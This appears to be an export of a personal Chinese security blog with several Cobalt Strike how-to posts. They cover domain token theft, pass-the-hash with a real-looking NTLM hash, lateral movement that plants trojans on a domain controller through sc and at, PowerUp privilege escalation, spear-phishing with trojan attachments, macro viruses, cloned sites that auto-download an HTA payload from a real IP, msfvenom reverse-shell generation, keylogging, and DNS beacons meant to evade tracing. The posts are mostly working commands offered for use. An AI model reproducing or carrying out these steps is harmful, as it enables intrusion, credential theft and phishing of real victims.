<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">steal_token 2688 域控的超级管理员pID</span><br><span class="line">rev2self 恢复原来的令牌</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909092712491.png" alt="image-20210909092712491"></p>
</blockquote>
<p>就可以访问域控的盘符</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909092822870.png" alt="image-20210909092822870"></p>
</blockquote>
<p>2、制作令牌</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909094824525.png" alt="image-20210909094824525"></p>
</blockquote>
<p>3、hash认证</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pth GYLQ\Administrator 285deb0940e1630b59d2cd9590fcbc91</span><br></pre></td></tr></table></figure></div>

<h2 id="五、黄金票据"><a href="#五、黄金票据" class="headerlink" title="五、黄金票据"></a>五、黄金票据</h2><p>需要：用户、域名、域id krbtgt的hash</p>
<p>1、查看当前黄金票据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure></div>

<p>2、获取域SID</p>
<p><strong>shell whoami/user</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">用户名           SID                                        </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">b1\administrator S-1-5-21-204603982-2387576990-164658498-500</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909111945631.png" alt="image-20210909111945631"></p>
<p>3、清除当前票据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure></div>

<h2 id="六、内网横向渗透获取权限"><a href="#六、内网横向渗透获取权限" class="headerlink" title="六、内网横向渗透获取权限"></a>六、内网横向渗透获取权限</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>1、生成一个服务木马为test.exe</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124130444.png" alt="image-20210909124130444"></p>
</blockquote>
<p>然后上传到windows/users/administrator里面</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124342858.png" alt="image-20210909124342858"></p>
</blockquote>
<p><strong>2、将其复制到域控机内的temp中的命令，然后命名为a1.exe</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell copy C:\Users\administrator\test.exe \\WIN-NQ8TV3JGSN1\C$\windows\temp\a1.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124622586.png" alt="image-20210909124622586"></p>
</blockquote>
<p><strong>3、然后创建一个服务为a1</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell sc \\WIN-NQ8TV3JGSN1 create a1 binpath&#x3D; c:\windows\temp\a1.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124549860.png" alt="image-20210909124549860"></p>
</blockquote>
<p><strong>4、接着执行刚刚创建的服务a1</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell sc \\WIN-NQ8TV3JGSN1 start a1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124720994.png" alt="image-20210909124720994"></p>
</blockquote>
<p><strong>5、接着域控的机子上线CS的system权限</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909124808909.png" alt="image-20210909124808909"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这次会比较简单一些，就是定时执行文件</p>
<p>还是创建一个木马</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909125905362.png" alt="image-20210909125905362"></p>
</blockquote>
<p>1、然后保存为a2.exe,按照上面同样的命令复制到域控机内</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell copy C:\Users\administrator\a2.exe \\WIN-NQ8TV3JGSN1\C$\windows\temp\a2.exe</span><br><span class="line"></span><br><span class="line">查看是否上传成功</span><br><span class="line">shell dir \\WIN-NQ8TV3JGSN1\C\windows\temp</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909130103143.png" alt=""></p>
</blockquote>
<p>2、查看域控当前时间</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net time \\WIN-NQ8TV3JGSN1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909130133657.png" alt="image-20210909130133657"></p>
</blockquote>
<p>3、接着利用at来创建一个一分钟执行木马的计划</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell at \\WIN-NQ8TV3JGSN1 12:58:39 C:\windows\temp\a2.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909130158436.png" alt="image-20210909130158436"></p>
</blockquote>
<p>cs上线了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909130224917.png" alt="image-20210909130224917"></p>
</blockquote>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p><strong>上面做了个总结，下面是域控机无法联网的情况怎么办</strong></p>
<p>1、这是用中转器来进行获取域控</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909132957415.png" alt="image-20210909132957415"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133045542.png" alt="image-20210909133045542"></p>
</blockquote>
<p>2、接着生成一个a3.exe木马，返回beacon到刚刚创建的监听器</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133031147.png" alt="image-20210909133031147"></p>
<p>3、将a3.exe木马上传到users\administrator目录中</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133234326.png" alt="image-20210909133234326"></p>
</blockquote>
<p>4、然后下面命令将木马复制到域控机内</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell copy C:\Users\administrator\a3.exe \\WIN-NQ8TV3JGSN1\C$\windows\temp\a3.exe</span><br><span class="line"></span><br><span class="line">查看是否复制成功</span><br><span class="line">shell dir \\WIN-NQ8TV3JGSN1\C$\windows\temp</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133336372.png" alt="image-20210909133336372"></p>
</blockquote>
<p>5、查看当前时间和定时执行木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net time \\WIN-NQ8TV3JGSN1</span><br><span class="line"></span><br><span class="line">shell at \\WIN-NQ8TV3JGSN1 13:27:43  C:\windows\temp\a3.exe</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133430067.png" alt="image-20210909133430067"></p>
</blockquote>
<p>6、等到了我们定好的时间，不出网域控会smb形式上线</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133508072.png" alt="image-20210909133508072"></p>
</blockquote>
<p>结果图</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909133926749.png" alt="image-20210909133926749"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike权限提升</title>
    <url>/posts/127.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="powershell提权"><a href="#powershell提权" class="headerlink" title="powershell提权"></a>powershell提权</h1><blockquote>
<p>首先需要用到<a href="https://github.com/PowerShellEmpire/PowerTools" target="_blank" rel="noopener">PowerTools-master</a>里的一些工具powerup提权</p>
</blockquote>
<p>首先导入powerup</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell-import</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210907164245633.png" alt="image-20210907164245633"></p>
</blockquote>
<p> 接着，Invoke-AllChecks来扫描可用路径</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210907164432532.png" alt="image-20210907164432532"></p>
</blockquote>
<p>找我们的权限也能更改的文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210907164533271.png" alt="image-20210907164533271"></p>
</blockquote>
<p>其中F表示可操作，刚好我们的权限可以</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210907164558350.png" alt="image-20210907164558350"></p>
</blockquote>
<p>绑定命令到这个服务上增加用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell Install-ServiceBinary -ServiceName apache -UserName rockyou -Password test123test</span><br></pre></td></tr></table></figure></div>

<p>接着使用shell sc 来控制服务的启动服务，就会生成一个用户</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike鱼叉钓鱼</title>
    <url>/posts/138.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<p>只是演示一下过程，这个并不能保证防溯源</p>
<h1 id="鱼叉钓鱼"><a href="#鱼叉钓鱼" class="headerlink" title="鱼叉钓鱼"></a>鱼叉钓鱼</h1><p><strong>1、注册一个163邮件号码</strong></p>
<p>然后获取授权密码，并且保存</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906213844006.png" alt="image-20210906213844006"></p>
</blockquote>
<p><strong>2、去QQ邮箱中随便找一个邮件显示邮件原文</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214007462.png" alt="image-20210906214007462"></p>
</blockquote>
<p><strong>3、然后将其保存为txt文本</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214048467.png" alt="image-20210906214048467"></p>
</blockquote>
<p><strong>4、建立一个target.txt文本，放入你想钓鱼发送过去的人</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214129537.png" alt="image-20210906214129537"></p>
</blockquote>
<p><strong>5、接着来到攻击模块中的邮件钓鱼中打开界面</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214326076.png" alt="image-20210906214326076"></p>
</blockquote>
<p><strong>6、导入刚刚的target和模板的txt文件结果，附件导入木马，然后填写你刚刚mail的账号和密码</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214707780.png" alt="image-20210906214707780"></p>
</blockquote>
<p><strong>7、接着点击send就成功发送了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214805078.png" alt="image-20210906214805078"></p>
</blockquote>
<p>8、可以看到邮件中有了钓鱼文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906214858843.png" alt="image-20210906214858843"></p>
</blockquote>
<p>网站克隆也可以和邮件钓鱼一起使用</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike生成后门和钓鱼简单利用</title>
    <url>/posts/126.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><h2 id="一、HTML木马"><a href="#一、HTML木马" class="headerlink" title="一、HTML木马"></a><strong>一、HTML木马</strong></h2><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906115319918.png" alt="image-20210906115319918"></p>
</blockquote>
<p>接着去对方机子执行以下就ok了</p>
<h2 id="二、宏病毒"><a href="#二、宏病毒" class="headerlink" title="二、宏病毒"></a>二、宏病毒</h2><p>1、生成宏病毒，记得复制</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906115759760.png" alt="image-20210906115759760"></p>
</blockquote>
<p>2、弄一个word文档</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906115456554.png" alt="image-20210906115456554"></p>
</blockquote>
<p>3、设置一下点创建</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906115820840.png" alt="image-20210906115820840"></p>
</blockquote>
<p>4、将其他代码删掉，复制为宏病毒</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906121702797.png" alt="image-20210906121702797"></p>
</blockquote>
<p>5、接着保存按否，另存为启动宏，就制作好了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906121727887.png" alt="image-20210906121727887"></p>
</blockquote>
<p>当其他人打开文档就会执行</p>
<h2 id="三、可执行文件木马"><a href="#三、可执行文件木马" class="headerlink" title="三、可执行文件木马"></a>三、可执行文件木马</h2><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906124001981.png" alt="image-20210906124001981"></p>
</blockquote>
<p>执行就好</p>
<h1 id="钓鱼模块"><a href="#钓鱼模块" class="headerlink" title="钓鱼模块"></a>钓鱼模块</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>没多大用</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906125248032.png" alt="image-20210906125248032"></p>
</blockquote>
<p>收集客户端的一些信息</p>
<h2 id="2、克隆网站键盘记录"><a href="#2、克隆网站键盘记录" class="headerlink" title="2、克隆网站键盘记录"></a>2、克隆网站键盘记录</h2><p>说实话，感觉没用</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906131128976.png" alt="image-20210906131128976"></p>
</blockquote>
<p>可以看到输入的账号和密码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906162929100.png" alt="image-20210906162929100"></p>
</blockquote>
<h2 id="3、克隆网站自动下载执行木马"><a href="#3、克隆网站自动下载执行木马" class="headerlink" title="3、克隆网站自动下载执行木马"></a>3、克隆网站自动下载执行木马</h2><p>首先在上传钓鱼攻击文件/update.hta</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906170430619.png" alt="image-20210906170430619"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.99.163.64:80&#x2F;update.hta</span><br></pre></td></tr></table></figure></div>

<p>在克隆，选择上面的攻击下载地址</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906170530839.png" alt="image-20210906170530839"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.99.163.64:80&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>接着访问页面就会自动下载</p>
<h2 id="4、克隆msf中的ms14溢出的browser使用"><a href="#4、克隆msf中的ms14溢出的browser使用" class="headerlink" title="4、克隆msf中的ms14溢出的browser使用"></a>4、克隆msf中的ms14溢出的browser使用</h2><p>首先在msf创建ms14的网站木马（注意：只有ie浏览器才有用）</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906181600113.png" alt="image-20210906181600113"></p>
</blockquote>
<p>内网穿透后为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ad39402345.wicp.vip&#x2F;NyRpuJ3Xti</span><br></pre></td></tr></table></figure></div>

<p>然后cs克隆</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906181927113.png" alt="image-20210906181927113"></p>
</blockquote>
<p>接着拿ie访问生成的ip就会反弹shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906182043675.png" alt="image-20210906182043675"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906182054866.png" alt="image-20210906182054866"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike会话管理</title>
    <url>/posts/124.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h1><h2 id="1、派生会话"><a href="#1、派生会话" class="headerlink" title="1、派生会话"></a><strong>1、派生会话</strong></h2><p><strong>直接打开两个teamserver，然后进行派生，或者自身增加会话</strong></p>
<p>将会话派生到msf中，老版本的方法很简单，新版本去掉了reverse_tcp，演示一下。</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905162650330.png" alt="image-20210905162650330"></p>
<p>接着</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905162706340.png" alt="image-20210905162706340"></p>
</blockquote>
<p><strong>msf在监听就可以拿到会话</strong></p>
<h2 id="2、msf生成木马与cobalt-strike会话"><a href="#2、msf生成木马与cobalt-strike会话" class="headerlink" title="2、msf生成木马与cobalt strike会话"></a><strong>2、msf生成木马与cobalt strike会话</strong></h2><p>首先，生成一个反弹http协议的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;ad39402345.wicp.vip LPORT&#x3D;80 -f exe &gt; cs.exe</span><br></pre></td></tr></table></figure></div>

<p>cs监听这样设置</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905211203347.png" alt="image-20210905211203347"></p>
</blockquote>
<h2 id="3、msf会话派生到cs中"><a href="#3、msf会话派生到cs中" class="headerlink" title="3、msf会话派生到cs中"></a>3、msf会话派生到cs中</h2><p>这里使用payload_inject模块，会话会弹到cs中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lport 80</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905223241965.png" alt="image-20210905223241965"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike用户驱动攻击</title>
    <url>/posts/123.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="用户驱动攻击"><a href="#用户驱动攻击" class="headerlink" title="用户驱动攻击"></a>用户驱动攻击</h1><p>sleep 控制时间间隔 </p>
<p> *<em>1、屏幕截图 - screenhot *</em> </p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904201926403.png" alt="image-20210904201926403"></p>
</blockquote>
<p>2、进程列表</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904205814162.png" alt="image-20210904205814162"></p>
</blockquote>
<p>3、键盘记录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905095549128.png" alt="image-20210905095549128"></p>
</blockquote>
<p>4、关掉键盘记录和图片记录用jobs显示和jobkill [JID]来杀死</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905095638820.png" alt="image-20210905095638820"></p>
</blockquote>
<p>5、文件上传</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905095941499.png" alt="image-20210905095941499"></p>
</blockquote>
<p>6、远程VPC</p>
<p>就相当于远程桌面。</p>
<p>7、浏览器代理（仅仅针对ie）</p>
<p>8、端口扫描</p>
<blockquote>
<p><strong><img src="https://gylq.gitee.io/cloudimages/img/image-20210905105400112.png" alt="image-20210905105400112"></strong></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210905105526331.png" alt="image-20210905105526331"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike之DNS Beacon（反溯源）</title>
    <url>/posts/122.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li><p>实际意义：红蓝对抗中，可以通过DNS的方式通信，流量更加隐秘，躲避agent/DLP的检测，实现相对隐秘的渗透方式，反溯源。</p>
</li>
<li><p>环境：vps（linux）<strong>注意这里有个雷区，需要打开53端口的TCP和UDP</strong>，截个图大家看看，这个地方我踩哭了，因为新手一直以为是TCP，结果因为没开UDP，导致一直不成功。</p>
</li>
<li><p>前期思路准备：</p>
<p>1、国外域名</p>
<p>2、cobaltstrike 3.3</p>
<p>3、国外代理</p>
</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904150540499.png" alt="image-20210904150540499"></p>
<h1 id="域名和解析域名服务器的免费申请和配置"><a href="#域名和解析域名服务器的免费申请和配置" class="headerlink" title="域名和解析域名服务器的免费申请和配置"></a>域名和解析域名服务器的免费申请和配置</h1><p><strong>1、挂上代理，去<a href="https://www.freenom.com/zh/index.html?lang=zh" target="_blank" rel="noopener">国外免费域名网站</a>找一个域名注册</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904151757886.png" alt="image-20210904151757886"></p>
</blockquote>
<p><strong>2、然后点击免费获取，然后接着往下走</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904151857754.png" alt="image-20210904151857754"></p>
</blockquote>
<p><strong>3、这里需要注意，因为ip检查，可能正常的瞎填信息无法获取订单，首先去<a href="https://en.ipip.net/ip.html" target="_blank" rel="noopener">查ip网站</a>确定我们代理的具体位置</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904152226132.png" alt="image-20210904152226132"></p>
</blockquote>
